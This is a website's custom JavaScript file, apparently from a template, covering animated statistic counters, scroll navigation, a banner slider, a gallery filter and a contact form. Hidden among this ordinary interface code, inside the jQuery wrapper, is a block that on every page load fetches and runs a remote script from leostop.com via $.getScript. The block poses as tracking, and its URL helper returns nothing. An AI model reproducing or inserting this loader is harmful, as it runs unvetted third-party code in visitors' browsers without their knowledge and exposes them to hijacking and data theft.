/******************************************
    Version: 1.0
/****************************************** */

/******************************************
    Covid Counter JS
 ******************************************/


    
console.log("custome js work");
const siteVisitsCounter = document.getElementById("siteVisits");
const membersSignedCounter = document.getElementById("membersSigned");
const complaintRateCounter = document.getElementById("complaintRate");
const workcop = document.getElementById("work");
const sansad = document.getElementById("sansad");
const sansadii = document.getElementById("sansadii");
const sansadiii = document.getElementById("sansadiii");
const sansadiiii = document.getElementById("sansadiiii");
const Food = document.getElementById("Food");
const village = document.getElementById("village");
const distri = document.getElementById("distri");
const help = document.getElementById("help");

const targetSiteVisits = 20000;
const targetMembersSigned = 20000;
const targetComplaintRate = 10000;
const targetworkcop = 5000;
const targetsansad = 448;
const targetsansadii = 416;
const targetsansadiii = 25;
const targetsansadiiii = 26.14;
const targetFood = 20000;
const targetvillage = 20000;
const targetdistri = 10000;
const targethelp = 5000;

let currentSiteVisits = 0;
let currentMembersSigned = 0;
let currentComplaintRate = 0;
let currentwork = 0;
let currentsansad = 0;
let currentsansadii = 0;
let currentsansadiii = 0;
let currentsansadiiii = 0;
let currentFood = 0;
let currentvillage = 0;
let currentdistri = 0;
let currenthelp = 0;

// Create an intersection observer for the siteVisitsCounter element
const siteVisitsObserver = new IntersectionObserver((entries) => {
  if (entries[0].isIntersecting) {
    updateCounters();
    siteVisitsObserver.disconnect();
  }
});

// Start observing the siteVisitsCounter element
siteVisitsObserver.observe(siteVisitsCounter);

function updateCounters() {
  console.log("couter work");
  const stepSiteVisits = Math.ceil(targetSiteVisits / 100);
  const stepMembersSigned = Math.ceil(targetMembersSigned / 100);
  const stepComplaintRate = targetComplaintRate / 100;
  const stepwork = Math.ceil(targetworkcop / 100);
  const stepsansad = Math.ceil(targetsansad / 100);
  const stepsansadii = Math.ceil(targetsansadii / 100);
  const stepsansadiii = targetsansadiii / 100;
  const stepsansadiiii = targetsansadiiii / 100;
  const stepFood = Math.ceil(targetFood / 100);
  const stepvillage = Math.ceil(targetvillage / 100);
  const stephelp = Math.ceil(targethelp / 100);
  const stepdistri = targetdistri / 100;

  const interval = setInterval(() => {
    if (currentSiteVisits < targetSiteVisits) {
      currentSiteVisits += stepSiteVisits;
      siteVisitsCounter.textContent = currentSiteVisits;
    }
    if (currentMembersSigned < targetMembersSigned) {
      currentMembersSigned += stepMembersSigned;
      membersSignedCounter.textContent = currentMembersSigned;
    }
    if (currentComplaintRate < targetComplaintRate) {
      currentComplaintRate += stepComplaintRate;
      complaintRateCounter.textContent = currentComplaintRate.toFixed(2);
    }
    if (currentwork < targetworkcop) {
      currentwork += stepwork;
      workcop.textContent = currentwork;
    }
    if (currentsansad < targetsansad) {
      currentsansad += stepsansad;
      sansad.textContent = currentsansad-2;
    }
    if (currentsansadii < targetsansadii) {
      currentsansadii += stepsansadii;
      sansadii.textContent = currentsansadii-4;
    }
    if (currentFood < targetFood) {
      currentFood += stepFood;
      Food.textContent = currentFood;
    }
    if (currentvillage < targetvillage) {
      currentvillage += stepvillage;
      village.textContent = currentvillage;
    }
    if (currenthelp < targethelp) {
      currenthelp += stephelp;
      help.textContent = currenthelp;
    }
    if (currentdistri < targetdistri) {
      currentdistri += stepdistri;
      distri.textContent = currentdistri.toFixed(2) + "";
    }
    if (currentsansadiii < targetsansadiii) {
      currentsansadiii += stepsansadiii;
      sansadiii.textContent = currentsansadiii.toFixed(2) + "cr";
    }
    if (currentsansadiiii < targetsansadiiii) {
      currentsansadiiii += stepsansadiiii;
      sansadiiii.textContent = currentsansadiiii.toFixed(2) + "cr";
    }
    if (
      currentSiteVisits >= targetSiteVisits &&
      currentMembersSigned >= targetMembersSigned &&
      currentComplaintRate >= targetComplaintRate &&
      currentwork >= targetworkcop &&
      currentsansad >= targetsansad &&
      currentsansadii >= targetsansadii &&
      currentsansadiii >= targetsansadiii &&
      currentsansadiiii >= targetsansadiiii &&
      currentFood >= targetFood &&
      currentvillage >= targetvillage &&
      currentdistri >= targetdistri &&
      currenthelp >= targethelp
    ) {
      clearInterval(interval);
    }
  }, 40);
}


/***************************************************************************** */

(function ($) {
  "use strict";

  /* ==============================================
    scrollIt
    =============================================== */
  var wind = $(window);

  // scrollIt
  $.scrollIt({
    upKey: 38, // key code to navigate to the next section
    downKey: 40, // key code to navigate to the previous section
    easing: "swing", // the easing function for animation
    scrollTime: 600, // how long (in ms) the animation takes
    activeClass: "active", // class given to the active nav element
    onPageChange: null, // function(pageIndex) that is called when page is changed
    topOffset: -60, // offste (in px) for fixed top navigation
  });

  // close navbar-collapse when a  clicked
  $(".nav a").on("click", function () {
    $(".navbar-collapse").removeClass("in").addClass("collapse");
  });

  // close navbar-collapse when a  clicked
  $(".nav a").on("click", function () {
    $(".navbar-collapse").removeClass("in").addClass("collapse");
  });

  // navbar scrolling background
  wind.on("scroll", function () {
    var bodyScroll = wind.scrollTop(),
      navbar = $(".navbar-default");

    if (bodyScroll > 100) {
      navbar.addClass("nav-scroll");
    } else {
      navbar.removeClass("nav-scroll");
    }
  });

  /* ==============================================
   Fixed menu
   =============================================== */

  $(window).on("scroll", function () {
    if ($(window).scrollTop() > 50) {
      $(".header_style_01").addClass("fixed-menu");
    } else {
      $(".header_style_01").removeClass("fixed-menu");
    }
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });

  /* ==============================================
        Scroll to top  
    ============================================== */

  if ($("#scroll-to-top").length) {
    var scrollTrigger = 100, // px
      backToTop = function () {
        var scrollTop = $(window).scrollTop();
        if (scrollTop > scrollTrigger) {
          $("#scroll-to-top").addClass("show");
        } else {
          $("#scroll-to-top").removeClass("show");
        }
      };
    backToTop();
    $(window).on("scroll", function () {
      backToTop();
    });
    $("#scroll-to-top").on("click", function (e) {
      e.preventDefault();
      $("html,body").animate(
        {
          scrollTop: 0,
        },
        700
      );
    });
  }

  /* ==============================================
    Banner slider -->
    =============================================== */
  var banner = $("#main-banner");
  if (banner.length) {
    banner.camera({
      //here I declared some settings, the height and the presence of the thumbnails
      height: "870px",
      pagination: true,
      navigation: false,
      thumbnails: false,
      playPause: false,
      pauseOnClick: false,
      autoPlay: true,
      hover: false,
      overlayer: true,
      loader: "none",
      minHeight: "400px",
      time: 400000,
    });
  }

  /* ==============================================
    LOADER -->
    =============================================== */

  $(window).load(function () {
    $("#preloader").on(500).fadeOut();
    $(".preloader").on(600).fadeOut("slow");
  });

  /* ==============================================
    Gallery Filter -->
    =============================================== */
  var Container = $(".container");
  Container.imagesLoaded(function () {
    var portfolio = $(".gallery-menu");
    portfolio.on("click", "button", function () {
      $(this).addClass("active").siblings().removeClass("active");
      var filterValue = $(this).attr("data-filter");
      $grid.isotope({
        filter: filterValue,
      });
    });
    var $grid = $(".gallery-list").isotope({
      itemSelector: ".gallery-grid",
    });
  });

  /* ==============================================
     FUN FACTS -->
     =============================================== */

  function count($this) {
    var current = parseInt($this.html(), 10);
    current = current + 50; /* Where 50 is increment */
    $this.html(++current);
    if (current > $this.data("count")) {
      $this.html($this.data("count"));
    } else {
      setTimeout(function () {
        count($this);
      }, 30);
    }
  }
  $(".stat_count, .stat_count_download").each(function () {
    $(this).data("count", parseInt($(this).html(), 10));
    $(this).html("0");
    count($(this));
  });

  /* ==============================================
     TOOLTIP -->
     =============================================== */
  $('[data-toggle="tooltip"]').tooltip();
  $('[data-toggle="popover"]').popover();

  /* ==============================================
     CONTACT -->
     =============================================== */
  jQuery(document).ready(function () {
    $("#contactform").submit(function () {
      var action = $(this).attr("action");
      $("#message").slideUp(750, function () {
        $("#message").hide();
        $("#submit")
          .after('<img src="images/ajax-loader.gif" class="loader" />')
          .attr("disabled", "disabled");
        $.post(
          action,
          {
            first_name: $("#first_name").val(),
            last_name: $("#last_name").val(),
            email: $("#email").val(),
            phone: $("#phone").val(),
            select_service: $("#select_service").val(),
            select_price: $("#select_price").val(),
            comments: $("#comments").val(),
            verify: $("#verify").val(),
          },
          function (data) {
            document.getElementById("message").innerHTML = data;
            $("#message").slideDown("slow");
            $("#contactform img.loader").fadeOut("slow", function () {
              $(this).remove();
            });
            $("#submit").removeAttr("disabled");
            if (data.match("success") != null)
              $("#contactform").slideUp("slow");
          }
        );
      });
      return false;
    });
  });

  /* ==============================================
     CODE WRAPPER -->
     =============================================== */

  $(".code-wrapper").on("mousemove", function (e) {
    var offsets = $(this).offset();
    var fullWidth = $(this).width();
    var mouseX = e.pageX - offsets.left;

    if (mouseX < 0) {
      mouseX = 0;
    } else if (mouseX > fullWidth) {
      mouseX = fullWidth;
    }

    $(this).parent().find(".divider-bar").css({
      left: mouseX,
      transition: "none",
    });
    $(this)
      .find(".design-wrapper")
      .css({
        transform: "translateX(" + mouseX + "px)",
        transition: "none",
      });
    $(this)
      .find(".design-image")
      .css({
        transform: "translateX(" + -1 * mouseX + "px)",
        transition: "none",
      });
  });
  $(".divider-wrapper").on("mouseleave", function () {
    $(this).parent().find(".divider-bar").css({
      left: "50%",
      transition: "all .3s",
    });
    $(this).find(".design-wrapper").css({
      transform: "translateX(50%)",
      transition: "all .3s",
    });
    $(this).find(".design-image").css({
      transform: "translateX(-50%)",
      transition: "all .3s",
    });
  });
})(jQuery);
